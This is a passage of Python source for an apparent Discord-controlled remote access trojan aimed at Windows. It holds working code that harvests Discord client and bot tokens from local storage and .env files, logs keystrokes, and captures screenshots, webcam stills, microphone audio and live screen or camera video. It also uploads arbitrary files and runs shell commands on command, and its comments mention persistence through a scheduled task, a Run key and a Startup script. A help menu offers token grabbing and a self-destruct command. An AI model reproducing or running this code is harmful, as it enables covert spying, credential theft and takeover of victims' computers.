            self._speak(audio, (1 | 2) if want == "screen" else 1)
        log(f"video: op12 announced={self.signalled} ssrc={self.video_ssrc} "
            f"type={want} streams={len(streams)} from_ready={self.from_ready}")

    def retract(self):
        if not self.signalled:
            return
        self._speak(self.video_ssrc, 0)
        self._speak(int(_vc_attr(self.vc, "ssrc") or 0), 1)
        self._ws_send({"op": 12, "d": {
            "audio_ssrc": int(_vc_attr(self.vc, "ssrc") or 0),
            "video_ssrc": 0, "rtx_ssrc": 0, "streams": []}})

    def spawn(self):
        cmd = build_ffmpeg_cmd(self.source, self._cam_sel)
        log("video ffmpeg: " + " ".join(cmd))
        self.proc = subprocess.Popen(
            cmd, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE,
            stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW, bufsize=0)
        self._spawn_at = time.time()
        self._killed = False
        threading.Thread(target=self._drain_err, args=(self.proc,),
                         daemon=True).start()

    def _drain_err(self, proc):
        try:
            for line in proc.stderr:
                s = line.decode("utf-8", "ignore").strip()
                if s:
                    self._err_tail.append(s)
                    del self._err_tail[:-15]
        except Exception:
            pass

    def _sock(self):
        for holder in (self.vc, getattr(self.vc, "_connection", None)):
            if holder is None:
                continue
            for n in ("sock", "socket", "_socket"):
                s = getattr(holder, n, None)
                if s is not None and hasattr(s, "sendto"):
                    if not self._buf_tuned:
                        self._buf_tuned = True
                        try:
                            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF,
                                         1 << 20)
                        except Exception:
                            pass
                    return s
        if not self._warned_sock:
            self._warned_sock = True
            log("video: no usable UDP socket found")
        return None

    def _sendto(self, sock, data, ep):
        for attempt in range(8):
            try:
                sock.sendto(data, ep)
                return True
            except BlockingIOError:
                time.sleep(0.001 * (attempt + 1))
            except Exception as e:
                self.send_errors += 1
                if self.send_errors < 4:
                    log(f"video: sendto failed: {e}")
                return False
        self.send_errors += 1
        return False

    def _dave(self, payload):
        if not DAVEY_OK:
            return payload
        conn = getattr(self.vc, "_connection", None)
        sess = getattr(conn, "dave_session", None) if conn else None
        if self._dave_ok is None:
            self._dave_ok = (bool(sess)
                             and bool(getattr(conn, "can_encrypt", True))
                             and bool(getattr(sess, "ready", True)))
            log(f"video: dave {'on' if self._dave_ok else 'off'}")
        if not self._dave_ok or sess is None:
            return payload
        try:
            mt = _enum_member(davey.MediaType, "video", "VIDEO")
            cd = _enum_member(davey.Codec, "h264", "H264")
            out = bytes(sess.encrypt(mt, cd, bytes(payload)))
            self._dave_miss = 0
            return out
        except Exception as e:
            if "NotReady" in str(e):
                self._dave_miss += 1
                if self._dave_miss > 120:
                    log("video: dave stuck NotReady -> plaintext")
                    self._dave_ok = False
            else:
                log(f"video: dave encrypt failed: {e} -> plaintext")
                self._dave_ok = False
            return payload

    def _encrypt(self, header, payload):
        mode = _vc_attr(self.vc, "mode") or ""
        fn = getattr(self.vc, f"_encrypt_{mode}", None)
        if fn is None:
            log(f"video: no _encrypt_{mode or '?'} -> plaintext")
            return header + payload
        try:
            out = fn(header, payload)
        except Exception as e:
            log(f"video: transport encrypt failed ({e}) -> plain")
            return header + payload
        if isinstance(out, tuple):
            if len(out) == 2:
                return bytes(out[0]) + bytes(out[1])
            return b"".join(bytes(x) for x in out)
        return bytes(out)

    def _header(self, marker):
        h = bytearray(12)
        h[0] = 0x90            # v2, X=1 (the rid extension below needs it)
        h[1] = (0x80 if marker else 0) | VIDEO_PAYLOAD_TYPE
        struct.pack_into(">H", h, 2, self.seq)
        struct.pack_into(">I", h, 4, self.ts)
        struct.pack_into(">I", h, 8, self.video_ssrc)
        return bytes(h) + self.rid_ext

    def _send_frame(self, frame):
        if not frame:
            return
        data = self._dave(frame)
        sock = self._sock()
        if sock is None:
            return
        ep = (_vc_attr(self.vc, "endpoint_ip"), _vc_attr(self.vc, "voice_port"))
        if ep[0] is None or ep[1] is None:
            log(f"video: bad endpoint {ep}")
            return
        off, total = 0, len(data)
        while off < total:
            piece = data[off:off + MAX_VIDEO_PAYLOAD]
            off += len(piece)
            if self._sendto(sock, self._encrypt(self._header(off >= total), piece), ep):
                self.packets += 1
                self.bytes += len(piece)
            self.seq = (self.seq + 1) & 0xFFFF
        self.ts = (self.ts + self.frame_ticks) & 0xFFFFFFFF
        self.frames += 1
        if self.frames == 1:
            log(f"video: first frame {total}B -> "
                f"{(total + MAX_VIDEO_PAYLOAD - 1) // MAX_VIDEO_PAYLOAD} packet(s)")
        elif self.frames % 150 == 0:
            log(f"video: {self.frames} frames / {self.packets} packets sent")

    def _nal(self, buf):
        i = buf.find(b"\x00\x00\x01")
        if i < 0:
            if len(buf) > 2:
                del buf[:-2]
            return None
        start = i + 3
        j = buf.find(b"\x00\x00\x01", start)
        if j < 0:
            return None
        end = j
        while end > start and buf[end - 1] == 0:
            end -= 1
        nal = bytes(buf[start:end])
        del buf[:j]
        return nal

    def _flush(self):
        if self.frame and self.have_vcl:
            self._send_frame(bytes(self.frame))
        self.frame = bytearray()
        self.have_vcl = False

    def _handle(self, nal):
        if not nal:
            return
        t = nal[0] & 0x1F
        if t == 9 and self.frame:          # access unit delimiter = new frame
            self._flush()
        self.frame += b"\x00\x00\x01" + nal
        if t in (1, 5):
            self.have_vcl = True

    def pump(self):
        buf = bytearray()
        while not self._stop.is_set():
            chunk = self.proc.stdout.read(65536)
            if not chunk:
                break
            buf += chunk
            while True:
                nal = self._nal(buf)
                if nal is None:
                    break
                self._handle(nal)


def _stop_locked():
    global VIDEO_SENDER
    s = VIDEO_SENDER
    VIDEO_SENDER = None
    if s is not None:
        try:
            s.stop()
            s.join(timeout=5)
        except Exception:
            pass


def stop_video():
    """Blocking. NEVER call this straight from the event loop -- the sender
    may be waiting on the loop in _ws_send, and join() would freeze it."""
    with _VIDEO_LOCK:
        _stop_locked()


def video_running():
    s = VIDEO_SENDER
    return s is not None and s.is_alive()


def start_video(vc, source):
    global VIDEO_SENDER
    if source in ("off", "none", "no", ""):
        stop_video()
        return None
    if not ffmpeg_ok():
        log("video: ffmpeg not available")
        return None

    # resolve the camera OUTSIDE the lock: probing can take several seconds
    if source == "cam":
        if cam_source(force=True) is None:
            log("no webcam found -> falling back to screen")
            source = "screen"
    elif source == "both":
        cam_source()

    with _VIDEO_LOCK:
        _stop_locked()
        VIDEO_SENDER = VideoSender(vc, source)
        VIDEO_SENDER.start()
        return VIDEO_SENDER


# ----------------------------------------------------------------------------
# background fetches
# ----------------------------------------------------------------------------

def fetch_opus():
    dest = os.path.join(INSTALL_DIR, "libopus-0.x64.dll")
    if _load_opus():
        return True
    for url in OPUS_URLS:
        if not _download(url, dest, timeout=90, tries=2):
            continue
        try:
            with open(dest, "rb") as f:
                if f.read(2) != b"MZ":
                    log(f"opus from {url} is not a PE file")
                    continue
        except OSError:
            continue
        if _load_opus():
            log(f"libopus fetched -> {dest}")
            return True
    log("libopus fetch failed -> voice unavailable")
    return False


def _startup_probe():
    try:
        threading.Thread(target=_ffmpeg_watcher, daemon=True).start()
        if AUTO_OPUS:
            fetch_opus()
        try:
            if ffmpeg_ok():
                cam_source()
        except Exception:
            pass
    except Exception:
        log("startup probe failed:\n" + traceback.format_exc())


# ----------------------------------------------------------------------------
# mutex / sibling handling
# ----------------------------------------------------------------------------

def acquire_mutex():
    """False = we created the mutex (sole instance). True = someone else holds it."""
    global _MUTEX_HANDLE
    if _k32 is None:
        return False
    try:
        ctypes.set_last_error(0)
        h = _k32.CreateMutexW(None, False, MUTEX_NAME)
        err = ctypes.get_last_error()
        if not h:
            return False
        if err == ERROR_ALREADY_EXISTS:
            _k32.CloseHandle(h)
            return True
        _MUTEX_HANDLE = h
        return False
    except Exception:
        return False


def other_instance_pids():
    pat_py = "|".join(sorted(re.escape(n) for n in
                             (INSTALL_BASENAME, APP_NAME + ".py",
                              APP_NAME + ".pyw", APP_NAME + ".exe",
                              APP_NAME + "\\")))
    exe_re = re.escape(os.path.basename(
        sys.executable if (FROZEN and sys.executable) else INSTALL_FILE))

    # the real Windows svchost.exe also matches on name, so it is filtered on
    # the service flag (' -k ') and on living inside a Windows system dir
    ps = (
        "$me = " + str(os.getpid()) + "\n"
        "$anc = New-Object 'System.Collections.Generic.HashSet[int]'\n"
        "$cur = $me\n"
        "for ($i = 0; $i -lt 16 -and $cur -gt 0; $i++) {\n"
        "  $null = $anc.Add([int]$cur)\n"
        "  $pp = Get-CimInstance Win32_Process -Filter \"ProcessId=$cur\"\n"
        "  if (-not $pp) { break }\n"
        "  $cur = [int]$pp.ParentProcessId\n"
        "}\n"
        "Get-CimInstance Win32_Process | Where-Object {\n"
        "  $n = $_.Name; $p = $_.ExecutablePath; $cl = $_.CommandLine\n"
        "  if (-not $cl) { return $false }\n"
        "  if ($anc.Contains([int]$_.ProcessId)) { return $false }\n"
        "  if ($n -match '^(python|pythonw)\\.exe$') {\n"
        "    return ($cl -match '" + pat_py + "')\n"
        "  }\n"
        "  if ($n -match '^" + exe_re + "$') {\n"
        "    if ($cl -match ' -k ') { return $false }\n"
        "    if ($p -and ($p -match '\\\\Windows\\\\(System32|SysWOW64|WinSxS)\\\\')) {"
        " return $false }\n"
        "    return $true\n"
        "  }\n"
        "  return $false\n"
        "} | ForEach-Object { \"$($_.ProcessId)|$($_.Name)|$($_.CommandLine)\" }\n"
    )
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps],
            capture_output=True, text=True, timeout=30,
            creationflags=CREATE_NO_WINDOW)
    except Exception as e:
        log(f"instance scan failed: {e}")
        return []
    found = []
    for line in (r.stdout or "").splitlines():
        line = line.strip()
        if "|" not in line:
            continue
        parts = line.split("|", 2)
        if parts[0].strip().isdigit():
            found.append((int(parts[0]), parts[1].strip() or "?",
                          parts[2].strip() if len(parts) > 2 else ""))
    return found


def kill_pid(pid):
    try:
        r = subprocess.run(["taskkill", "/PID", str(pid), "/F"],
                           capture_output=True, text=True, timeout=15,
                           creationflags=CREATE_NO_WINDOW)
        out = ((r.stdout or "") + (r.stderr or "")).strip().replace("\n", " ")
        log(f"  taskkill {pid} rc={r.returncode}: {out or '(no output)'}")
        return r.returncode == 0
    except Exception as e:
        log(f"  taskkill {pid} failed: {e}")
        return False


def claim_instance(wait=12.0):
    """True = run. False = a healthy instance already owns this box.

    The mutex decides the winner; the heartbeat is only the liveness check.
    Three launchers at logon (task + Run key + Startup vbs) all land here and
    exactly one survives, with no online/offline flapping."""
    if FORCE:
        log("--force: skipping the instance check")
        return True

    if not acquire_mutex():
        log("mutex acquired (sole instance)")
        return True

    log("another instance holds the mutex -> checking liveness")
    end = time.time() + wait
    while time.time() < end:
        owner = hb_owner()
        if owner is not None:
            log(f"live instance pid={owner} -> exiting")
            return False
        if not acquire_mutex():
            log("previous owner released the mutex -> taking over")
            return True
        time.sleep(0.3)

    log("no live owner after timeout -> reaping siblings")
    if KEEP_OTHER or NOKILL:
        log("--keep-other/--no-kill: leaving them alone")
        pids = []
    else:
        pids = other_instance_pids()
        log(f"scan done: {len(pids)} candidate(s)")
        for pid, name, cmd in pids:
            log(f"  candidate pid={pid} name={name} cmd={cmd}")
        for pid, name, _cmd in pids:
            log(f"killing pid={pid} ({name})")
            kill_pid(pid)
        if pids:
            time.sleep(1.0)

    end = time.time() + 20.0
    while time.time() < end:
        if not acquire_mutex():
            log(f"mutex acquired pid={os.getpid()}")
            return True
        time.sleep(0.3)
    log("!! mutex still held after timeout - expect doubled replies")
    return True


# ----------------------------------------------------------------------------
# token
# ----------------------------------------------------------------------------

def _clean_token(blob):
    for line in (blob or "").replace("\ufeff", "").splitlines():
        s = line.strip().strip('"').strip("'").strip()
        if not s or s.startswith("#") or s.startswith("PASTE_"):
            continue
        return s
    return ""


def find_token():
    t = _clean_token(TOKEN)
    if t:
        return t, "embedded TOKEN"
    for p in (TOKEN_FILE, os.path.join(script_dir(), "token.txt")):
        t = _clean_token(read_text(p))
        if t:
            return t, p
    t = _clean_token(os.environ.get("DISCORD_TOKEN") or "")
    if t:
        return t, "DISCORD_TOKEN env"
    return "", ""


def ensure_token_file():
    if not os.path.isfile(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, "w", encoding="utf-8") as f:
                f.write("# optional override -- the embedded TOKEN wins\n")
                f.write("PASTE_YOUR_BOT_TOKEN_HERE\n")
        except Exception as e:
            log(f"token.txt write failed: {e}")
    return TOKEN_FILE


# ----------------------------------------------------------------------------
# discord token harvesting
# ----------------------------------------------------------------------------

TOKEN_RE = re.compile(r"(?:mfa\.[A-Za-z0-9_-]{80,90}"
                      r"|[A-Za-z0-9_-]{20,30}\.[A-Za-z0-9_-]{5,8}"
                      r"\.[A-Za-z0-9_-]{25,45})")

_DISCORD_DIRS = ("discord", "discordptb", "discordcanary",
                 "discorddevelopment", "lightcord")


def _localstorage_dirs():
    out = []
    for root in (os.environ.get("APPDATA") or "",
                 os.environ.get("LOCALAPPDATA") or ""):
        if not root:
            continue
        for name in _DISCORD_DIRS:
            p = os.path.join(root, name, "Local Storage", "leveldb")
            if os.path.isdir(p) and p not in out:
                out.append(p)
        p = os.path.join(root, "Discord", "Local Storage", "leveldb")
        if os.path.isdir(p) and p not in out:
            out.append(p)
    return out


def scan_client_tokens():
    """{token: source} out of the Discord client's leveldb."""
    found = {}
    for d in _localstorage_dirs():
        try:
            files = (glob.glob(os.path.join(d, "*.ldb")) +
                     glob.glob(os.path.join(d, "*.log")))
            files.sort(key=lambda p: os.path.getmtime(p), reverse=True)
        except Exception:
            files = []
        tag = os.path.basename(os.path.dirname(os.path.dirname(d)))
        for p in files:
            try:
                blob = open(p, "rb").read()
            except OSError:
                continue
            text = blob.decode("utf-8", "ignore")
            for m in re.finditer(r'"token"\s*:\s*"([^"]+)"', text):
                t = m.group(1).strip()
                if TOKEN_RE.fullmatch(t):
                    found.setdefault(t, f"{tag}/{os.path.basename(p)}")
            for m in TOKEN_RE.finditer(text):
                found.setdefault(m.group(0), f"{tag}/{os.path.basename(p)}")
    return found


def discord_whoami(token, bot=False):
    req = urllib.request.Request(
        "https://discord.com/api/v10/users/@me",
        headers={"Authorization": ("Bot " + token) if bot else token,
                 "User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            d = json.loads(r.read().decode("utf-8", "ignore"))
        name = d.get("username") or "?"
        disc = d.get("discriminator") or "0"
        tag = f"{name}#{disc}" if disc and disc != "0" else name
        extra = " [BOT]" if d.get("bot") else ""
        return True, f"{tag} ({d.get('id')}){extra}"
    except urllib.error.HTTPError as e:
        return False, f"HTTP {e.code}"
    except Exception as e:
        return False, str(e)[:80]


def _mask(tok):
    return tok if len(tok) <= 44 else f"{tok[:24]}...{tok[-10:]}"


def harvest_tokens():
    """(bot_tokens, client_tokens) -- both plain lists of (label, token)."""
    bots, clients = [], []

    def _add_bot(label, tok):
        if tok and all(t != tok for _, t in bots):
            bots.append((label, tok))

    _add_bot("embedded TOKEN", _clean_token(TOKEN))
    for p in (TOKEN_FILE, os.path.join(script_dir(), "token.txt")):
        _add_bot(p, _clean_token(read_text(p)))
    _add_bot("DISCORD_TOKEN env", _clean_token(os.environ.get("DISCORD_TOKEN") or ""))
    for p in (os.path.join(script_dir(), ".env"),
              os.path.join(os.path.expanduser("~"), ".env")):
        try:
            txt = open(p, encoding="utf-8", errors="ignore").read()
        except OSError:
            continue
        for m in TOKEN_RE.finditer(txt):
            _add_bot(f"{p} (token-like)", m.group(0))

    for tok, src in scan_client_tokens().items():
        clients.append((src, tok))
    return bots, clients


# ----------------------------------------------------------------------------
# device identity
# ----------------------------------------------------------------------------

def safe_user():
    try:
        return getpass.getuser()
    except Exception:
        return os.environ.get("USERNAME", "user")


def host_name():
    try:
        return socket.gethostname()
    except Exception:
        return "unknown-host"


def device_fingerprint():
    raw = f"{host_name()}|{safe_user()}|{platform.machine()}"
    return hashlib.md5(raw.encode("utf-8", "ignore")).hexdigest()[:6]


def sanitize(name):
    out = [c if (c.isalnum() or c in "-_") else "-" for c in name.lower()]
    s = "".join(out).strip("-")
    while "--" in s:
        s = s.replace("--", "-")
    return s[:80] or "device"


def device_channel_name():
    return f"{sanitize(host_name())}-{device_fingerprint()}"


def local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "?"


def public_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=6) as r:
            return r.read().decode().strip()
    except Exception:
        return "?"


def device_report():
    return (
        f"**Device:** `{host_name()}`\n"
        f"**User:** `{safe_user()}`\n"
        f"**OS:** `{platform.system()} {platform.release()} ({platform.machine()})`\n"
        f"**Admin:** `{'yes' if is_admin() else 'no'}`\n"
        f"**Local IP:** `{local_ip()}`\n"
        f"**Public IP:** `{public_ip()}`\n"
        f"**Fingerprint:** `{device_fingerprint()}`\n"
        f"Use `{PREFIX}help` in this channel."
    )


# ----------------------------------------------------------------------------
# keylogger
# ----------------------------------------------------------------------------

KEYLOG_LOCK     = threading.Lock()
KEYLOG_BUF      = []
KEYLOG_LISTENER = None
KEYLOG_STARTED  = 0.0
KEYLOG_COUNT    = 0
KEYLOG_MAX      = 200000
# Y'all can add more keylog_ignore if y want
_KEYLOG_IGNORE = {
    "shift", "shift_r", "shift_l", "ctrl", "ctrl_l", "ctrl_r", "alt", "alt_l",
    "alt_r", "alt_gr", "cmd", "cmd_l", "cmd_r", "caps_lock", "num_lock",
    "scroll_lock", "pause", "insert", "menu", "print_screen",
}


def _keylog_on_press(key):
    global KEYLOG_COUNT
    try:
        if pynput_keyboard is None:
            return
        text = None
        if isinstance(key, pynput_keyboard.Key):
            name = key.name
            if name in _KEYLOG_IGNORE:
                return
            if name == "space":
                text = " "
            elif name == "enter":
                text = "\n"
            elif name == "tab":
                text = "\t"
            elif name == "backspace":
                text = None
            else:
                text = f"[{name}]"
        else:
            ch = getattr(key, "char", None)
            if ch is None:
                return
            text = ch
        with KEYLOG_LOCK:
            if text is None:
                if KEYLOG_BUF:
                    KEYLOG_BUF.pop()
            else:
                KEYLOG_BUF.append(text)
            KEYLOG_COUNT += 1
            if len(KEYLOG_BUF) > KEYLOG_MAX:
                del KEYLOG_BUF[:KEYLOG_MAX // 4]
    except Exception:
        pass


def keylog_start():
    global KEYLOG_LISTENER, KEYLOG_STARTED, KEYLOG_COUNT
    if pynput_keyboard is None:
        return False
    with KEYLOG_LOCK:
        if KEYLOG_LISTENER is not None:
            return True
    try:
        lst = pynput_keyboard.Listener(on_press=_keylog_on_press)
        lst.daemon = True
        lst.start()
    except Exception as e:
        log(f"keylogger start failed: {e}")
        return False
    with KEYLOG_LOCK:
        KEYLOG_LISTENER = lst
        KEYLOG_STARTED = time.time()
        KEYLOG_COUNT = 0
    log("keylogger started")
    return True


def keylog_take():
    with KEYLOG_LOCK:
        text = "".join(KEYLOG_BUF)
        KEYLOG_BUF.clear()
    return text


def keylog_stop():
    global KEYLOG_LISTENER
    with KEYLOG_LOCK:
        lst = KEYLOG_LISTENER
        KEYLOG_LISTENER = None
    if lst is not None:
        try:
            lst.stop()
        except Exception:
            pass
        log("keylogger stopped")
    return keylog_take()


def keylog_status():
    with KEYLOG_LOCK:
        running = KEYLOG_LISTENER is not None
        chars = len(KEYLOG_BUF)
        since = KEYLOG_STARTED
    up = f"{int(time.time() - since)}s" if running and since else "-"
    return running, chars, up


# ----------------------------------------------------------------------------
# filesystem helpers
# ----------------------------------------------------------------------------

def human_size(n):
    try:
        n = float(n)
    except Exception:
        return "?"
    for unit in ("B", "KB", "MB", "GB"):
        if n < 1024 or unit == "GB":
            return f"{n:.0f} {unit}" if unit == "B" else f"{n:.1f} {unit}"
        n /= 1024.0
    return f"{n:.1f} TB"


def resolve_path(raw):
    p = (raw or "").strip().strip('"').strip("'")
    if not p:
        return None
    p = os.path.expandvars(os.path.expanduser(p))
    if os.path.exists(p):
        return p
    drive = os.path.splitdrive(os.getcwd())[0] + os.sep
    for base in (os.getcwd(), drive):
        cand = os.path.join(base, p)
        if os.path.exists(cand):
            return cand
    return p


def drive_roots():
    out = []
    for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        root = f"{letter}:\\"
        if os.path.exists(root):
            out.append(root)
    return out or [os.path.abspath(os.sep)]


def upload_limit(ctx):
    lim = None
    g = getattr(ctx, "guild", None)
    if g is not None:
        lim = getattr(g, "filesize_limit", None)
    if not lim:
        lim = 8 * 1024 * 1024
    return max(1 << 20, int(lim) - 512 * 1024)


async def send_any_file(ctx, path, content=None):
    if not os.path.isfile(path):
        await ctx.send(f"`[!]` not a file: `{path}`")
        return 0
    size = os.path.getsize(path)
    name = os.path.basename(path)
    limit = upload_limit(ctx)

    if size <= limit:
        await ctx.send(content=content or f"`[+]` `{name}` — {human_size(size)}",
                       file=discord.File(path, filename=name))
        return 1

    parts = (size + limit - 1) // limit
    if parts > 40:
        await ctx.send(f"`[i]` {human_size(size)} -> {parts} parts; "
                       f"sending the first 40.")
        parts = 40
    await ctx.send(f"`[i]` `{name}` is {human_size(size)}, over the "
                   f"{human_size(limit)} limit -> sending {parts} part(s).")
    sent = 0
    with open(path, "rb") as f:
        for i in range(parts):
            chunk = f.read(limit)
            if not chunk:
                break
            fn = f"{name}.{i + 1:03d}"
            await ctx.send(file=discord.File(io.BytesIO(chunk), filename=fn))
            sent += 1
            await asyncio.sleep(0.4)
    await ctx.send(f"`[+]` Done — {sent} part(s). Rejoin with "
                   f"`copy /b {name}.001+{name}.002+... {name}`")
    return sent + 2


def zip_path(target):
    base = os.path.join(TMP_DIR,
                        sanitize(os.path.basename(target.rstrip("\\/")) or "folder"))
    if os.path.isfile(base + ".zip"):
        try:
            os.remove(base + ".zip")
        except OSError:
            pass
    return shutil.make_archive(base, "zip", root_dir=target)


def record_clip(path, seconds, source="cam"):
    if not ffmpeg_ok():
        raise RuntimeError("ffmpeg not available")

    if source == "screen":
        cmds = [["-f", "gdigrab", "-framerate", str(VIDEO_FPS),
                 "-draw_mouse", "1", "-i", "desktop"]]
    else:
        cmds = [_cam_args(k, n) for k, n in _cam_sources()]
        if not cmds:
            raise RuntimeError("no webcam found")

    errs = []
    for src_args in cmds:
        cmd = ([FFMPEG, "-hide_banner", "-loglevel", "error", "-y"] + src_args
               + ["-t", f"{float(seconds):g}",
                  "-vf", _video_filter(),
                  "-vcodec", "libx264", "-preset", "ultrafast",
                  "-pix_fmt", "yuv420p", "-movflags", "+faststart", path])
        try:
            r = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=float(seconds) + 90,
                               creationflags=CREATE_NO_WINDOW)
        except subprocess.TimeoutExpired:
            errs.append("timed out")
            continue
        if r.returncode == 0 and os.path.isfile(path) and os.path.getsize(path):
            return
        errs.append((r.stderr or "failed").strip()[:200])
    raise RuntimeError(errs[-1] if errs else "record failed")


# ----------------------------------------------------------------------------
# capture / shell / tts
# ----------------------------------------------------------------------------

def record_audio(path, seconds=10, fs=44100):
    if sd is None:
        raise RuntimeError("sounddevice missing")
    rec = sd.rec(int(seconds * fs), samplerate=fs, channels=1, dtype="int16")
    sd.wait()
    with wave.open(path, "wb") as wf:
        wf.setnchannels(1)
        wf.setsampwidth(2)
        wf.setframerate(fs)
        wf.writeframes(rec.tobytes())


def take_screenshot(path):
    if mss is None:
        raise RuntimeError("mss missing")
    with mss.mss() as sct:
        img = sct.grab(sct.monitors[0])
        mss.tools.to_png(img.rgb, img.size, output=path)


def _webcam_snapshot_cv2(path):
    backends = [cv2.CAP_DSHOW, cv2.CAP_MSMF, cv2.CAP_ANY]
    last = "no device opened"
    for idx in range(4):
        for backend in backends:
            cap = None
            try:
                cap = cv2.VideoCapture(idx, backend)
                if not cap.isOpened():
                    last = f"idx{idx}/be{backend}: not opened"
                    continue
                for _ in range(12):
                    cap.read()
                    time.sleep(0.05)
                ok, frame = cap.read()
                if ok and frame is not None:
                    if cv2.imwrite(path, frame):
                        return
                    last = f"idx{idx}/be{backend}: imwrite failed"
                else:
                    last = f"idx{idx}/be{backend}: read failed"
            except Exception as e:
                last = f"idx{idx}/be{backend}: {e}"
            finally:
                if cap is not None:
                    try:
                        cap.release()
                    except Exception:
                        pass
    raise RuntimeError(last)


def _webcam_snapshot_ffmpeg(path):
    if not ffmpeg_ok():
        raise RuntimeError("ffmpeg not available")
    last = "no camera opened"
    for k, n in _cam_sources():
        cmd = ([FFMPEG, "-hide_banner", "-loglevel", "error", "-y"]
               + _cam_args(k, n) +
               ["-frames:v", "1", "-q:v", "3", path])
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=40,
                               creationflags=CREATE_NO_WINDOW)
        except Exception as e:
            last = str(e)
            continue
        if r.returncode == 0 and os.path.isfile(path):
            return
        last = (r.stderr or "grab failed").strip()[:200]
    raise RuntimeError(last)


def webcam_snapshot(path):
    if cv2 is not None:
        try:
            _webcam_snapshot_cv2(path)
            return "cv2"
        except Exception as e:
            log(f"cam: cv2 failed ({e}) -> trying ffmpeg")
    _webcam_snapshot_ffmpeg(path)
    return "ffmpeg"


def run_shell(command):
    try:
        p = subprocess.run(command, shell=True, capture_output=True, text=True,
                           timeout=120, creationflags=CREATE_NO_WINDOW)
        return ((p.stdout or "") + (p.stderr or "")).strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return "(command timed out)"
    except Exception as e:
        return f"Error: {e}"


def say_worker(text, rate=None, volume=None):
    with SAY_LOCK:
        try:
            os.makedirs(TMP_DIR, exist_ok=True)
            txt = os.path.join(TMP_DIR, "say.txt")
            with open(txt, "w", encoding="utf-8") as f:
                f.write(text)
            q = txt.replace("'", "''")
            ps = ("$ErrorActionPreference='Stop';"
                  f"$t = Get-Content -Raw -Encoding UTF8 '{q}';"
                  "if (-not $t) { exit };"
                  "try { $v = New-Object -ComObject SAPI.SpVoice }"
                  " catch { Add-Type -AssemblyName System.Speech;"
                  " $v = New-Object System.Speech.Synthesis.SpeechSynthesizer };"
                  + (f"$v.Rate = {int(rate)};" if rate is not None else "")
                  + (f"$v.Volume = {int(volume)};" if volume is not None else "")
                  + "$v.Speak($t) | Out-Null;")
            r = subprocess.run(
                ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
                 "-Command", ps],
                capture_output=True, text=True, timeout=600,
                creationflags=CREATE_NO_WINDOW)
            if r.returncode != 0:
                log(f"say failed rc={r.returncode}: {(r.stderr or '').strip()[:300]}")
        except Exception:
            log("say failed:\n" + traceback.format_exc())


def latest_log():
    best, best_m = None, -1.0
    for p in (LOG_FILE, TMP_LOG):
        try:
            m = os.path.getmtime(p)
        except OSError:
            continue
        if m > best_m:
            best, best_m = p, m
    return best


# ----------------------------------------------------------------------------
# live mic stream
# ----------------------------------------------------------------------------

VOICE_SOURCE = None


class MicAudioSource(discord.AudioSource):
    FRAME = 3840

    def __init__(self, device=None):
        if sd is None or np is None:
            raise RuntimeError("sounddevice / numpy missing")
        self._q = queue.Queue(maxsize=100)
        self._buf = bytearray()
        self._silence = b"\x00" * self.FRAME
        info = sd.query_devices(device, "input")
        self.channels = 2 if info.get("max_input_channels", 1) >= 2 else 1
        self._stream = sd.InputStream(
            samplerate=48000, channels=self.channels, dtype="int16",
            blocksize=960, device=device, callback=self._cb)
        self._stream.start()
        log(f"mic open: {info.get('name')} ch={self.channels}")

    def _cb(self, indata, frames, time_info, status):
        try:
            if self.channels == 1:
                self._q.put_nowait(np.repeat(indata, 2, axis=1).tobytes())
            else:
                self._q.put_nowait(bytes(indata))
        except queue.Full:
            pass

    def read(self):
        while len(self._buf) < self.FRAME:
            try:
                self._buf += self._q.get(timeout=0.5)
            except queue.Empty:
                break
        if len(self._buf) < self.FRAME:
            return self._silence
        out = bytes(self._buf[:self.FRAME])
        del self._buf[:self.FRAME]
        return out

    def cleanup(self):
        try:
            self._stream.stop()
            self._stream.close()
        except Exception:
            pass

    def is_opus(self):
        return False


async def _voice_teardown():
    global VOICE_SOURCE
    await asyncio.to_thread(stop_video)
    try:
        if VOICE_SOURCE is not None:
            try:
                VOICE_SOURCE.cleanup()
            except Exception:
                pass
            VOICE_SOURCE = None
        vc = None
        for g in bot.guilds:
            vc = g.voice_client
            if vc is not None:
                break
        if vc is not None:
            try:
                if vc.is_playing():
                    vc.stop()
            except Exception:
                pass
            await vc.disconnect(force=True)
    except Exception:
        log("teardown failed:\n" + traceback.format_exc())


# ----------------------------------------------------------------------------
# bot
# ----------------------------------------------------------------------------

bot = None
_REPORTED = False
_HANDLED = set()
_VIDEO_WAIT_TASK = None

HELP_TEXT = f"""**{APP_NAME}** on `{host_name()}`

`{PREFIX}help` — this
`{PREFIX}ping` — pipeline check
`{PREFIX}setup` — create/verify the device channel
`{PREFIX}info` — device + network report
`{PREFIX}debug` — diagnostics
`{PREFIX}dtoken` — grab discord client tokens + bot tokens
`{PREFIX}log [n]` — tail the log
`{PREFIX}fileview [path]` — list a folder (no path = drives)
`{PREFIX}filetransfer <path>` — send a file (split if too big)
`{PREFIX}say <text>` — speak out of the default voice
`{PREFIX}screenshot` — screen grab
`{PREFIX}cam` — webcam still
`{PREFIX}mic [secs]` — record the default input
`{PREFIX}keylogger start|send|stop` — record keystrokes, dump them, stop
`{PREFIX}shell <cmd>` — run a command
`{PREFIX}clip` / `{PREFIX}setclip <text>` — clipboard
`{PREFIX}type <text>` — type on the keyboard
`{PREFIX}vcjoin [screen|cam|both|off]` — mic + video into your voice channel
`{PREFIX}vcleave` — leave the voice channel
`{PREFIX}record <secs> [cam|screen]` — record a clip and upload it
`{PREFIX}self-destruct` — wipe every artefact, delete the channel, vanish

Commands are case-insensitive.
"""


def command(**kw):
    def deco(fn):
        return commands.Command(fn, **kw)
    return deco


async def send_long(ctx, text, code=False):
    text = text if text else "(no output)"
